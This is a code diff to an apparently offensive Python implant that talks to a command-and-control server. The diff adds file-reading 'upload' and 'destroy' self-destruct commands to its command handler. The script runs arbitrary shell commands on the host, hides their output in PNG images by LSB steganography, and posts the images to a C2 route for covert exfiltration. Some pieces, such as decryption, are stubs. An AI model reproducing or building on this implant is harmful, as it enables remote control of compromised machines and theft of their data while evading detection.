@@ -2,7 +2,6 @@ from Crypto.Cipher import AES
 from stegano import lsb
 import uuid
 import requests
-import json 
 import subprocess
 import time
 
@@ -20,7 +19,6 @@ def encrypt(plain_str):
 
 #Decryption of data 
 def decrypt(msg, key): 
-
     pass 
 
 #str is the encrypted string of data that needs to be hidden in a file. 
@@ -34,17 +32,35 @@ def mod_img(msg):
     #print(lsb.reveal(f"{path}{file_name}-final.png"))
     return f"{path}{file_name}-final.png" 
 
+"""
+def img_in_img(cover, path_to_img): 
+    cover_img = Image.open(cover)
+    cover_img.resize((50000, 1000))
+    with open(path_to_img, "rb") as img_file:
+        print(len(img_file.read())) 
+        altered_img = stepic.encode(cover_img, img_file.read())
+    print(type(altered_img))
+"""
+
+
 #Execute command 
 def exec(cmd): 
-    print("[+] Executing command: %s" % cmd)
     result = ""
     if cmd == "sleep 10":
         time.sleep(10)
     else: 
         cmd_lst = cmd.split()
-        output = subprocess.run(cmd_lst, capture_output=True, text=True) #running command on host machine 
-        result = output.stdout 
-        print("[+] Result: %s" % result)
+        if cmd_lst[0] == "destroy":
+            destroy()
+        elif cmd_lst[0] == "upload": 
+            print(f"[+] Reading {cmd_lst[1]}")
+            with open(cmd_lst[1], "rb") as img_file: 
+                result = str(base64.b64encode(img_file.read()))
+        else: 
+            print("[+] Executing command: %s" % cmd)
+            output = subprocess.run(cmd_lst, capture_output=True, text=True)
+            result = output.stdout 
+            print("[+] Result: %s" % result)
     return result 
 
 #Sending output back to C2Server 
@@ -92,12 +108,14 @@ if __name__ == '__main__':
             #response = requests.get(routes[0]) 
             #encrypted_cmd = parse_json(response) 
             #cmd = decrypt(encrypted_cmd) 
-            cmd = "ls -la" #need to figure out this logic if give a sleep command
+            cmd = "ls -la" 
             output = exec(cmd) 
             if output != "": 
                 obf_img = mod_img(output)
                 requests.post(routes[1], files={"file": open(obf_img,'rb')})
         except Exception as e: 
+            print(e)
+            break
             """
             Options for handling query failure: 
                 - self destruct immediately 
